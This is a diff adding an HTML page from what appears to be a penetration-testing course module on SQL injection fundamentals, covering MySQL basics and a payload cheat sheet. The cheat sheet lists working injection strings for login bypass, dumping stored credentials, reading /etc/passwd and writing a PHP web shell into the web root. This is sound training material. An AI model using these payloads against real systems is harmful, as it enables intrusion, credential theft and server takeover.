@@ -1,0 +1,1742 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+
+<h1 id="15-sql-injection-fundamentals">15. SQL Injection Fundamentals</h1>
+<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
+<p>The cheat sheet is a useful command reference for this module.</p>
+<h3 id="mysql">MySQL</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>General</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code></td>
+<td>login to mysql database</td>
+</tr>
+<tr>
+<td><code>SHOW DATABASES</code></td>
+<td>List available databases</td>
+</tr>
+<tr>
+<td><code>USE users</code></td>
+<td>Switch to database</td>
+</tr>
+<tr>
+<td><strong>Tables</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>CREATE TABLE logins (id INT, ...)</code></td>
+<td>Add a new table</td>
+</tr>
+<tr>
+<td><code>SHOW TABLES</code></td>
+<td>List available tables in current database</td>
+</tr>
+<tr>
+<td><code>DESCRIBE logins</code></td>
+<td>Show table properties and columns</td>
+</tr>
+<tr>
+<td><code>INSERT INTO table_name VALUES (value_1,..)</code></td>
+<td>Add values to table</td>
+</tr>
+<tr>
+<td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td>
+<td>Add values to specific columns in a table</td>
+</tr>
+<tr>
+<td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code></td>
+<td>Update table values</td>
+</tr>
+<tr>
+<td><strong>Columns</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>SELECT * FROM table_name</code></td>
+<td>Show all columns in a table</td>
+</tr>
+<tr>
+<td><code>SELECT column1, column2 FROM table_name</code></td>
+<td>Show specific columns in a table</td>
+</tr>
+<tr>
+<td><code>DROP TABLE logins</code></td>
+<td>Delete a table</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins ADD newColumn INT</code></td>
+<td>Add new column</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td>
+<td>Rename column</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td>
+<td>Change column datatype</td>
+</tr>
+<tr>
+<td><code>ALTER TABLE logins DROP oldColumn</code></td>
+<td>Delete column</td>
+</tr>
+<tr>
+<td><strong>Output</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1</code></td>
+<td>Sort by column</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td>
+<td>Sort by column in descending order</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td>
+<td>Sort by two-columns</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins LIMIT 2</code></td>
+<td>Only show first two results</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins LIMIT 1, 2</code></td>
+<td>Only show first two results starting from index 2</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></td>
+<td>List results that meet a condition</td>
+</tr>
+<tr>
+<td><code>SELECT * FROM logins WHERE username LIKE 'admin%'</code></td>
+<td>List results where the name is similar to a given string</td>
+</tr>
+</tbody>
+</table>
+<h3 id="mysql-operator-precedence">MySQL Operator Precedence</h3>
+<ul>
+<li>Division (<code>/</code>), Multiplication (<code>*</code>), and Modulus (<code>%</code>)</li>
+<li>Addition (<code>+</code>) and Subtraction (<code>-</code>)</li>
+<li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>, <code>LIKE</code>)</li>
+<li>NOT (<code>!</code>)</li>
+<li>AND (<code>&amp;&amp;</code>)</li>
+<li>OR (<code>||</code>)</li>
+</ul>
+<h3 id="sql-injection">SQL Injection</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Payload</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Auth Bypass</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>admin' or '1'='1</code></td>
+<td>Basic Auth Bypass</td>
+</tr>
+<tr>
+<td><code>admin')-- -</code></td>
+<td>Basic Auth Bypass With comments</td>
+</tr>
+<tr>
+<td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Auth Bypass Payloads</a></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Union Injection</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>' order by 1-- -</code></td>
+<td>Detect number of columns using <code>order by</code></td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,2,3-- -</code></td>
+<td>Detect number of columns using Union injection</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,@@version,3,4-- -</code></td>
+<td>Basic Union injection</td>
+</tr>
+<tr>
+<td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td>
+<td>Union injection for 4 columns</td>
+</tr>
+<tr>
+<td><strong>DB Enumeration</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>SELECT @@version</code></td>
+<td>Fingerprint MySQL with query output</td>
+</tr>
+<tr>
+<td><code>SELECT SLEEP(5)</code></td>
+<td>Fingerprint MySQL with no output</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,database(),2,3-- -</code></td>
+<td>Current database name</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td>
+<td>List all databases</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -</code></td>
+<td>List all tables in a specific database</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -</code></td>
+<td>List all columns in a specific table</td>
+</tr>
+<tr>
+<td><code>cn' UNION select 1, username, password, 4 from dev.credentials-- -</code></td>
+<td>Dump data from a table in another database</td>
+</tr>
+<tr>
+<td><strong>Privileges</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>cn' UNION SELECT 1, user(), 3, 4-- -</code></td>
+<td>Find current user</td>
+</tr>
+<tr>
+<td><code>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -</code></td>
+<td>Find if user has admin privileges</td>
+</tr>
+<tr>
+<td><code>cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -</code></td>
+<td>Find if all user privileges</td>
+</tr>
+<tr>
+<td><code>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</code></td>
+<td>Find which directories can be accessed through MySQL</td>
+</tr>
+<tr>
+<td><strong>File Injection</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</code></td>
+<td>Read local file</td>
+</tr>
+<tr>
+<td><code>select 'file written successfully!' into outfile '/var/www/html/proof.txt'</code></td>
+<td>Write a string to a local file</td>
+</tr>
+<tr>
+<td><code>cn' union select "",'&lt;?php system($_REQUEST[0]); ?&gt;', "", "" into outfile '/var/www/html/shell.php'-- -</code></td>
+<td>Write a web shell into the base web directory</td>
+</tr>
+</tbody>
+</table>
+<h2 id="introduction">Introduction</h2>
+<hr>
+<p>Most modern web applications utilize a database structure on the back-end. Such databases are used to store and retrieve data related to the web application, from actual web content to user information and content, and so on. To make the web applications dynamic, the web application has to interact with the database in real-time. As HTTP(S) requests arrive from the user, the web application's back-end will issue queries to the database to build the response. These queries can include information from the HTTP(S) request or other relevant information.</p>
+<p><img src="storage\modules\33\db\_request\_3.png" alt="dbms\_architecture"></p>
+<p>When user-supplied information is used to construct the query to the database, malicious users can trick the query into being used for something other than what the original programmer intended, providing the user access to query the database using an attack known as SQL injection (SQLi).</p>
+<p>SQL injection refers to attacks against relational databases such as <code>MySQL</code> (whereas injections against non-relational databases, such as MongoDB, are NoSQL injection). This module will focus on <code>MySQL</code> to introduce SQL Injection concepts.</p>
+<hr>
+<h3 id="sql-injection-sqli-">SQL Injection (SQLi)</h3>
+<p>Many types of injection vulnerabilities are possible within web applications, such as HTTP injection, code injection, and command injection. The most common example, however, is SQL injection. A SQL injection occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL queries directly against the database.</p>
+<p>There are many ways to accomplish this. To get a SQL injection to work, the attacker must first inject SQL code and then subvert the web application logic by changing the original query or executing a completely new one. First, the attacker has to inject code outside the expected user input limits, so it does not get executed as simple user input. In the most basic case, this is done by injecting a single quote (<code>'</code>) or a double quote (<code>"</code>) to escape the limits of user input and inject data directly into the SQL query.</p>
+<p>Once an attacker can inject, they have to look for a way to execute a different SQL query. This can be done using SQL code to make up a working query that executes both the intended and the new SQL queries. There are many ways to achieve this, like using <a href="https://www.sqlinjection.net/stacked-queries/">stacked</a> queries or using <a href="https://www.mysqltutorial.org/sql-union-mysql.aspx/">Union</a> queries. Finally, to retrieve our new query's output, we have to interpret it or capture it on the web application's front end.</p>
+<hr>
+<h3 id="use-cases-and-impact">Use Cases and Impact</h3>
+<p>A SQL injection can have a tremendous impact, especially if privileges on the back-end server and database are very lax.</p>
+<p>First, we may retrieve secret/sensitive information that should not be visible to us, like user logins and passwords or credit card information, which can then be used for other malicious purposes. SQL injections cause many password and data breaches against websites, which are then re-used to steal user accounts, access other services, or perform other nefarious actions.</p>
+<p>Another use case of SQL injection is to subvert the intended web application logic. The most common example of this is bypassing login without passing a valid pair of username and password credentials. Another example is accessing features that are locked to specific users, like admin panels. Attackers may also be able to read and write files directly on the back-end server, which may, in turn, lead to placing back doors on the back-end server, and gaining direct control over it, and eventually taking control over the entire website.</p>
+<hr>
+<h3 id="prevention">Prevention</h3>
+<p>SQL injections are usually caused by poorly coded web applications or poorly secured back-end server and databases privileges. Later on, we will discuss ways to reduce the chances of being vulnerable to SQL injections through secure coding methods like user input sanitization and validation and proper back-end user privileges and control.</p>
+<h2 id="intro-to-databases">Intro to Databases</h2>
+<hr>
+<p>Before we learn about SQL injections, we need to learn more about databases and Structured Query Language (SQL), which databases will perform the necessary queries. Web applications utilize back-end databases to store various content and information related to the web application. This can be core web application assets like images and files, content like posts and updates, or user data like usernames and passwords.</p>
+<p>There are many different types of databases, each of which fits a particular type of use. Traditionally, an application used file-based databases, which was very slow with the increase in size. This led to the adoption of <code>Database Management Systems</code> (<code>DBMS</code>).</p>
+<hr>
+<h3 id="database-management-systems">Database Management Systems</h3>
+<p>A Database Management System (DBMS) helps create, define, host, and manage databases. Various kinds of DBMS were designed over time, such as file-based, Relational DBMS (RDBMS), NoSQL, Graph based, and Key/Value stores.</p>
+<p>There are multiple ways to interact with a DBMS, such as command-line tools, graphical interfaces, or even APIs (Application Programming Interfaces). DBMS is used in various banking, finance, and education sectors to record large amounts of data. Some of the essential features of a DBMS include:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Feature</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Concurrency</code></td>
+<td>A real-world application might have multiple users interacting with it simultaneously. A DBMS makes sure that these concurrent interactions succeed without corrupting or losing any data.</td>
+</tr>
+<tr>
+<td><code>Consistency</code></td>
+<td>With so many concurrent interactions, the DBMS needs to ensure that the data remains consistent and valid throughout the database.</td>
+</tr>
+<tr>
+<td><code>Security</code></td>
+<td>DBMS provides fine-grained security controls through user authentication and permissions. This will prevent unauthorized viewing or editing of sensitive data.</td>
+</tr>
+<tr>
+<td><code>Reliability</code></td>
+<td>It is easy to backup databases and rolls them back to a previous state in case of data loss or a breach.</td>
+</tr>
+<tr>
+<td><code>Structured Query Language</code></td>
+<td>SQL simplifies user interaction with the database with an intuitive syntax supporting various operations.</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="architecture">Architecture</h3>
+<p>The diagram below details a two-tiered architecture.</p>
+<p><img src="storage\modules\33\db\_2.png" alt="dbms\_architecture"></p>
+<p><code>Tier I</code> usually consists of client-side applications such as websites or GUI programs. These applications consist of high-level interactions such as user login or commenting. The data from these interactions is passed to <code>Tier II</code> through API calls or other requests.</p>
+<p>The second tier is the middleware, which interprets these events and puts them in a form required by the DBMS. Finally, the application layer uses specific libraries and drivers based on the type of DBMS to interact with them. The DBMS receives queries from the second tier and performs the requested operations. These operations could include insertion, retrieval, deletion, or updating of data. After processing, the DBMS returns any requested data or error codes in the event of invalid queries.</p>
+<p>It is possible to host the application server as well as the DBMS on the same host. However, databases with large amounts of data supporting many users are typically hosted separately to improve performance and scalability.</p>
+<h2 id="types-of-databases">Types of Databases</h2>
+<hr>
+<p>Databases, in general, are categorized into <code>Relational Databases</code> and <code>Non-Relational Databases</code>. Only Relational Databases utilize SQL, while Non-Relational databases utilize a variety of methods for communications.</p>
+<hr>
+<h3 id="relational-databases">Relational Databases</h3>
+<p>A relational database is the most common type of database. It uses a schema, a template, to dictate the data structure stored in the database. For example, we can imagine a company that sells products to its customers having some form of stored knowledge about where those products go, to whom, and in what quantity. However, this is often done in the back-end and without obvious informing in the front-end. Different types of relational databases can be used for each approach. For example, the first table can store and display basic customer information, the second the number of products sold and their cost, and the third table to enumerate who bought those products and with what payment data.</p>
+<p>Tables in a relational database are associated with keys that provide a quick database summary or access to the specific row or column when specific data needs to be reviewed. These tables, also called entities, are all related to each other. For example, the customer information table can provide each customer with a specific ID that can indicate everything we need to know about that customer, such as an address, name, and contact information. Also, the product description table can assign a specific ID to each product. The table that stores all orders would only need to record these IDs and their quantity. Any change in these tables will affect all of them but predictably and systematically.</p>
+<p>However, when processing an integrated database, a concept is required to link one table to another using its key, called a <code>relational database management system</code> (<code>RDBMS</code>). Many companies that initially use different concepts are switching to the RDBMS concept because this concept is easy to learn, use and understand. Initially, this concept was used only by large companies. However, many types of databases now implement the RDBMS concept, such as Microsoft Access, MySQL, SQL Server, Oracle, PostgreSQL, and many others.</p>
+<p>For example, we can have a <code>users</code> table in a relational database containing columns like <code>id</code>, <code>username</code>, <code>first_name</code>, <code>last_name</code>, and others. The <code>id</code> can be used as the table key. Another table, <code>posts</code>, may contain posts made by all users, with columns like <code>id</code>, <code>user_id</code>, <code>date</code>, <code>content</code>, and so on.</p>
+<p><img src="storage\modules\75\web\_apps\_relational\_db.jpg" alt="HTML Example"></p>
+<p>We can link the <code>id</code> from the <code>users</code> table to the <code>user_id</code> in the <code>posts</code> table to retrieve the user details for each post without storing all user details with each post. A table can have more than one key, as another column can be used as a key to link with another table. So, for example, the <code>id</code> column can be used as a key to link the <code>posts</code> table to another table containing comments, each of which belongs to a particular post, and so on.</p>
+<p>The relationship between tables within a database is called a Schema.</p>
+<p>This way, by using relational databases, it becomes rapid and easy to retrieve all data about a particular element from all databases. So, for example, we can retrieve all details linked to a specific user from all tables with a single query. This makes relational databases very fast and reliable for big datasets with clear structure and design and efficient data management. The most common example of relational databases is <code>MySQL</code>, which we will be covering in this module.</p>
+<hr>
+<h3 id="non-relational-databases">Non-relational Databases</h3>
+<p>A non-relational database (also called a <code>NoSQL</code> database) does not use tables, rows, and columns or prime keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored. Due to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. Therefore, when dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing such data. There are four common storage models for NoSQL databases:</p>
+<ul>
+<li>Key-Value</li>
+<li>Document-Based</li>
+<li>Wide-Column</li>
+<li>Graph</li>
+</ul>
+<p>Each of the above models has a different way of storing data. For example, the <code>Key-Value</code> model usually stores data in JSON or XML, and have a key for each pair, and stores all of its data as its value: <img src="storage\modules\75\web\_apps\_non-relational\_db.jpg" alt="HTML Example"></p>
+<p>The above example can be represented using JSON as:</p>
+<p>Code: json</p>
+<pre><code class="lang-json">{
+  <span class="hljs-attr">"100001"</span>: {
+    <span class="hljs-attr">"date"</span>: <span class="hljs-string">"01-01-2021"</span>,
+    <span class="hljs-attr">"content"</span>: <span class="hljs-string">"Welcome to this web application."</span>
+  },
+  <span class="hljs-attr">"100002"</span>: {
+    <span class="hljs-attr">"date"</span>: <span class="hljs-string">"02-01-2021"</span>,
+    <span class="hljs-attr">"content"</span>: <span class="hljs-string">"This is the first post on this web app."</span>
+  },
+  <span class="hljs-attr">"100003"</span>: {
+    <span class="hljs-attr">"date"</span>: <span class="hljs-string">"02-01-2021"</span>,
+    <span class="hljs-attr">"content"</span>: <span class="hljs-string">"Reminder: Tomorrow is the ..."</span>
+  }
+}
+</code></pre>
+<p>It looks similar to a dictionary item in languages like <code>Python</code> or <code>PHP</code> (i.e. <code>{'key':'value'}</code>), where the <code>key</code> is usually a string, and the <code>value</code> can be a string, dictionary, or any class object.</p>
+<p>The most common example of a NoSQL database is <code>MongoDB</code>.</p>
+<p>Non-relational Databases have a different method for injection, known as NoSQL injections. SQL injections are completely different than NoSQL injections. NoSQL injections will be covered in a later module.</p>
+<h2 id="intro-to-mysql">Intro to MySQL</h2>
+<hr>
+<p>This module introduces SQL injection through <code>MySQL</code>, and it is crucial to learn more about <code>MySQL</code> and SQL to understand how SQL injections work and utilize them properly. Therefore, this section will cover some of MySQL/SQL's basics and syntax and examples used within MySQL/MariaDB databases.</p>
+<hr>
+<h3 id="structured-query-language-sql-">Structured Query Language (SQL)</h3>
+<p>SQL syntax can differ from one RDBMS to another. However, they are all required to follow the <a href="https://en.wikipedia.org/wiki/ISO/IEC\_9075">ISO standard</a> for Structured Query Language. We will be following the MySQL/MariaDB syntax for the examples shown. SQL can be used to perform the following actions:</p>
+<ul>
+<li>Retrieve data</li>
+<li>Update data</li>
+<li>Delete data</li>
+<li>Create new tables and databases</li>
+<li>Add / remove users</li>
+<li>Assign permissions to these users</li>
+</ul>
+<hr>
+<h3 id="command-line">Command Line</h3>
+<p>The <code>mysql</code> utility is used to authenticate to and interact with a MySQL/MariaDB database. The <code>-u</code> flag is used to supply the username and the <code>-p</code> flag for the password. The <code>-p</code> flag should be passed empty, so we are prompted to enter the password and do not pass it directly on the command line since it could be stored in cleartext in the bash_history file.</p>
+<p>Intro to MySQL</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ mysql -u root -<span class="hljs-selector-tag">p</span>
+
+Enter password: &lt;password&gt;
+..<span class="hljs-selector-class">.SNIP</span>...
+
+mysql&gt;
+</code></pre>
+<p>Again, it is also possible to use the password directly in the command, though this should be avoided, as it could lead to the password being kept in logs and terminal history:</p>
+<p>Intro to MySQL</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ mysql -u root -p&lt;password&gt;
+
+...SNIP...
+
+mysql&gt;
+</code></pre>
+<p>Tip: There shouldn't be any spaces between '-p' and the password.</p>
+<p>The examples above log us in as the superuser, i.e.,"<code>root</code>" with the password "<code>password</code>," to have privileges to execute all commands. Other DBMS users would have certain privileges to which statements they can execute. We can view which privileges we have using the <a href="https://dev.mysql.com/doc/refman/8.0/en/show-grants.html">SHOW GRANTS</a> command be discussed later.</p>
+<p>When we do not specify a host, it will default to the <code>localhost</code> server. We can specify a remote host and port using the <code>-h</code> and <code>-P</code> flags.</p>
+<p>Intro to MySQL</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ mysql -u root -h docker<span class="hljs-selector-class">.hackthebox</span><span class="hljs-selector-class">.eu</span> -P <span class="hljs-number">3306</span> -<span class="hljs-selector-tag">p</span> 
+
+Enter password: 
+..<span class="hljs-selector-class">.SNIP</span>...
+
+mysql&gt;
+</code></pre>
+<p>Note: The default MySQL/MariaDB port is (3306), but it can be configured to another port. It is specified using an uppercase `P`, unlike the lowercase `p` used for passwords.</p>
+<p>Note: To follow along with the examples, try to use the 'mysql' tool on your PwnBox to log in to the DBMS found in the question at the end of the section, using its IP and port. Use 'root' for the username and 'password' for the password.</p>
+<hr>
+<h3 id="creating-a-database">Creating a database</h3>
+<p>Once we log in to the database using the <code>mysql</code> utility, we can start using SQL queries to interact with the DBMS. For example, a new database can be created within the MySQL DBMS using the <a href="https://dev.mysql.com/doc/refman/5.7/en/create-database.html">CREATE DATABASE</a> statement.</p>
+<p>Intro to MySQL</p>
+<pre><code class="lang-shell-session">mysql&gt; CREATE DATABASE users;
+
+Query OK, <span class="hljs-number">1</span> <span class="hljs-built_in">row</span> affected (<span class="hljs-number">0.02</span> <span class="hljs-built_in">sec</span>)
+</code></pre>
+<p>MySQL expects command-line queries to be terminated with a semi-colon. The example above created a new database named <code>users</code>. We can view the list of databases with <a href="https://dev.mysql.com/doc/refman/8.0/en/show-databases.html">SHOW DATABASES</a>, and we can switch to the <code>users</code> database with the <code>USE</code> statement:</p>
+<p>Intro to MySQL</p>
+<pre><code class="lang-shell-session">mysql&gt; SHOW DATABASES;
+
+<span class="hljs-code">+--------------------+</span>
+<span class="hljs-section">| Database           |
++--------------------+</span>
+| information<span class="hljs-emphasis">_schema |
+| mysql              |
+| performance_</span>schema |
+| sys                |
+<span class="hljs-section">| users              |
++--------------------+</span>
+
+mysql&gt; USE users;
+
+Database changed
+</code></pre>
+<p>SQL statements aren't case sensitive, which means 'USE users;' and 'use users;' refer to the same command. However, the database name is case sensitive, so we cannot do 'USE USERS;' instead of 'USE users;'. So, it is a good practice to specify statements in uppercase to avoid confusion.</p>
+<hr>
+<h3 id="tables">Tables</h3>
+<p>DBMS stores data in the form of tables. A table is made up of horizontal rows and vertical columns. The intersection of a row and a column is called a cell. Every table is created with a fixed set of columns, where each column is of a particular data type.</p>
+<p>A data type defines what kind of value is to be held by a column. Common examples are <code>numbers</code>, <code>strings</code>, <code>date</code>, <code>time</code>, and <code>binary data</code>. There could be data types specific to DBMS as well. A complete list of data types in MySQL can be found <a href="https://dev.mysql.com/doc/refman/8.0/en/data-types.html">here</a>. For example, let us create a table named <code>logins</code> to store user data, using the <a href="https://dev.mysql.com/doc/refman/8.0/en/creating-tables.html">CREATE TABLE</a> SQL query:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> logins (
+    <span class="hljs-keyword">id</span> <span class="hljs-built_in">INT</span>,
+    username <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>),
+    <span class="hljs-keyword">password</span> <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>),
+    date_of_joining DATETIME
+    );
+</code></pre>
+<p>As we can see, the <code>CREATE TABLE</code> query first specifies the table name, and then (within parentheses) we specify each column by its name and its data type, all being comma separated. After the name and type, we can specify specific properties, as will be discussed later.</p>
+<p>Intro to MySQL</p>
+<pre><code class="lang-shell-session">mysql&gt; CREATE TABLE logins (
+    -<span class="ruby">&gt;     id INT,
+</span>    -<span class="ruby">&gt;     username VARCHAR(<span class="hljs-number">100</span>),
+</span>    -<span class="ruby">&gt;     password VARCHAR(<span class="hljs-number">100</span>),
+</span>    -<span class="ruby">&gt;     date_of_joining DATETIME
+</span>    -<span class="ruby">&gt;     );
+</span>Query OK, 0 rows affected (0.03 sec)
+</code></pre>
+<p>The SQL queries above create a table named <code>logins</code> with four columns. The first column, <code>id</code> is an integer. The following two columns, <code>username</code> and <code>password</code> are set to strings of 100 characters each. Any input longer than this will result in an error. The <code>date_of_joining</code> column of type <code>DATETIME</code> stores the date when an entry was added.</p>
+<p>Intro to MySQL</p>
+<pre><code class="lang-shell-session">mysql&gt; SHOW TABLES;
+
+<span class="hljs-code">+-----------------+</span>
+<span class="hljs-section">| Tables_in_users |
++-----------------+</span>
+<span class="hljs-section">| logins          |
++-----------------+</span>
+1 row in set (0.00 sec)
+</code></pre>
+<p>A list of tables in the current database can be obtained using the <code>SHOW TABLES</code> statement. In addition, the <a href="https://dev.mysql.com/doc/refman/8.0/en/describe.html">DESCRIBE</a> keyword is used to list the table structure with its fields and data types.</p>
+<p>Intro to MySQL</p>
+<pre><code class="lang-shell-session">mysql&gt; DESCRIBE logins;
+
+<span class="hljs-code">+-----------------+</span>--------------+
+<span class="hljs-section">| Field           | Type         |
++-----------------+--------------+</span>
+| id              | int          |
+| username        | varchar(100) |
+| password        | varchar(100) |
+<span class="hljs-section">| date_of_joining | date         |
++-----------------+--------------+</span>
+4 rows in set (0.00 sec)
+</code></pre>
+<p><strong>Table Properties</strong></p>
+<p>Within the <code>CREATE TABLE</code> query, there are many <a href="https://dev.mysql.com/doc/refman/8.0/en/create-table.html">properties</a> that can be set for the table and each column. For example, we can set the <code>id</code> column to auto-increment using the <code>AUTO_INCREMENT</code> keyword, which automatically increments the id by one every time a new item is added to the table:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">    id <span class="hljs-built_in">INT</span> <span class="hljs-literal">NOT</span> <span class="hljs-literal">NULL</span> AUTO_INCREMENT,
+</code></pre>
+<p>The <code>NOT NULL</code> constraint ensures that a particular column is never left empty 'i.e., required field.' We can also use the <code>UNIQUE</code> constraint to ensures that the inserted item are always unique. For example, if we use it with the <code>username</code> column, we can ensure that no two users will have the same username:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">    username VARCHAR(<span class="hljs-number">100</span>) <span class="hljs-built_in">UNIQUE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-built_in">NULL</span>,
+</code></pre>
+<p>Another important keyword is the <code>DEFAULT</code> keyword, which is used to specify the default value. For example, within the <code>date_of_joining</code> column, we can set the default value to <a href="https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function\_now">Now()</a>, which in MySQL returns the current date and time:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">    date_of_joining DATETIME <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">NOW</span>(),
+</code></pre>
+<p>Finally, one of the most important properties is <code>PRIMARY KEY</code>, which we can use to uniquely identify each record in the table, referring to all data of a record within a table for relational databases, as previously discussed in the previous section. We can make the <code>id</code> column the <code>PRIMARY KEY</code> for this table:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">    PRIMARY KEY (<span class="hljs-name">id</span>)
+</code></pre>
+<p>The final <code>CREATE TABLE</code> query will be as follows:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> logins (
+    <span class="hljs-keyword">id</span> <span class="hljs-built_in">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> AUTO_INCREMENT,
+    username <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">UNIQUE</span> <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,
+    <span class="hljs-keyword">password</span> <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>,
+    date_of_joining DATETIME <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NOW</span>(),
+    PRIMARY <span class="hljs-keyword">KEY</span> (<span class="hljs-keyword">id</span>)
+    );
+</code></pre>
+<p>Note: Allow 10-15 seconds for the servers in the questions to start, to allow enough time for Apache/MySQL to initiate and run.</p>
+<h2 id="sql-statements">SQL Statements</h2>
+<hr>
+<p>Now that we understand how to use the <code>mysql</code> utility and create databases and tables, let us look at some of the essential SQL statements and their uses.</p>
+<hr>
+<h3 id="insert-statement">INSERT Statement</h3>
+<p>The <a href="https://dev.mysql.com/doc/refman/8.0/en/insert.html">INSERT</a> statement is used to add new records to a given table. The statement following the below syntax:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name <span class="hljs-keyword">VALUES</span> (column1_value, column2_value, column3_value, ...);
+</code></pre>
+<p>The syntax above requires the user to fill in values for all the columns present in the table.</p>
+<p>SQL Statements</p>
+<pre><code class="lang-shell-session">mysql&gt; INSERT INTO logins VALUES(<span class="hljs-number">1</span>, 'admin', 'p@ssw0rd', '<span class="hljs-number">2020</span><span class="hljs-number">-07</span><span class="hljs-number">-02</span>');
+
+Query OK, <span class="hljs-number">1</span> row affected (<span class="hljs-number">0.00</span> sec)
+</code></pre>
+<p>The example above shows how to add a new login to the logins table, with appropriate values for each column. However, we can skip filling columns with default values, such as <code>id</code> and <code>date_of_joining</code>. This can be done by specifying the column names to insert values into a table selectively:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">INSERT INTO table_name(<span class="hljs-name">column2</span>, column3, ...) VALUES (<span class="hljs-name">column2_value</span>, column3_value, ...)<span class="hljs-comment">;</span>
+</code></pre>
+<p>Note: skipping columns with the 'NOT NULL' constraint will result in an error, as it is a required value.</p>
+<p>We can do the same to insert values into the <code>logins</code> table:</p>
+<p>SQL Statements</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">mysql</span>&gt; <span class="hljs-selector-tag">INSERT</span> <span class="hljs-selector-tag">INTO</span> <span class="hljs-selector-tag">logins</span>(username, password) <span class="hljs-selector-tag">VALUES</span>(<span class="hljs-string">'administrator'</span>, <span class="hljs-string">'adm1n_p@ss'</span>);
+
+<span class="hljs-selector-tag">Query</span> <span class="hljs-selector-tag">OK</span>, <span class="hljs-selector-tag">1</span> <span class="hljs-selector-tag">row</span> <span class="hljs-selector-tag">affected</span> (<span class="hljs-number">0.00</span> sec)
+</code></pre>
